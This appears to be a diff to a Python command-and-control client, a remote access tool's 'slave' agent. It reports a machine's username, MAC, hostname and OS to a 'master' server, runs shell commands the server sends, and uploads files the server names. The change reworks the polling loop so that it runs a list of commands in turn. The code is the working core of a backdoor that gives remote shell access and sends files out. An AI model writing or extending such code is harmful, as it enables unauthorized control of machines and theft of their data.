@@ -16,7 +16,7 @@ base_url = "http://127.0.0.1:8000"
 
 def get_cmd_from_server():
     url = f"{base_url}/api/slave/command"
-    payload = {"username":username,"mac":mac,"hostname":hostname,"os":operating_system}
+    payload = {"username":username,"mac":mac,"hostname":hostname,"os":operating_system, "ostype": "LINUX"}
     output = requests.post(url, json = payload)
     return output.json()
 
@@ -66,13 +66,7 @@ def send_file_response_to_server(full_file_path):
         response = requests.post(url, files=files)
 
 
-while True:
-    print("[+] Getting command from server")
-    response = get_cmd_from_server()
-    if response == {}:
-        print("[+] Nothing to do")
-        time.sleep(SLEEP_IN_SECONDS)
-        continue
+def run_command_from_master(response):
     if response['type']=='SHELL':
         try:
             cmd_output = get_shell_output(response['command'])
@@ -91,5 +85,15 @@ while True:
         full_file_path = response['command']
         print("[+] Sending FILEDOWNLOAD Response back to MASTER..")
         send_file_response_to_server(full_file_path)
+while True:
+    print("[+] Getting command from server")
+    response = get_cmd_from_server()
+    if response == []:
+        print("[+] Nothing to do")
+        time.sleep(SLEEP_IN_SECONDS)
+        continue
+    
+    for curr_command in response:
+        run_command_from_master(curr_command)
 
     time.sleep(SLEEP_IN_SECONDS)
